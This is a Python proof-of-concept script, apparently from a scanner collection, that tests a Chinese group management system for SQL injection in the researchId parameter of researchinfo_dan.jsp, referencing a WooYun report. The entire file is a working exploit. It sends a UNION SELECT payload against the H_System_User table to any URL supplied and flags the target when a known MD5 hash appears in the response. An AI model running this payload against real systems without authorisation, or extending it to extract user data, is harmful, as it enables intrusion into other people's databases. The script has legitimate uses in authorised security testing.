#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 汇能群管理系统SQL注入
referer: http://wooyun.org/bugs/wooyun-2010-0152664
author: Lucifer
description: 链接/main/model/childcatalog/researchinfo_dan.jsp?researchId=1中 researchID未过滤存在SQL注入漏洞
'''
import sys
import requests
import warnings
from termcolor import cprint

class hnkj_researchinfo_dan_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        payload = "/main/model/childcatalog/researchinfo_dan.jsp?researchId=-1%20union%20select%201,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27)),3%20from%20H_System_User--"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)

            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                cprint("[+]存在汇能群管理系统 SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = hnkj_researchinfo_dan_sqli_BaseVerify(sys.argv[1])
    testVuln.run()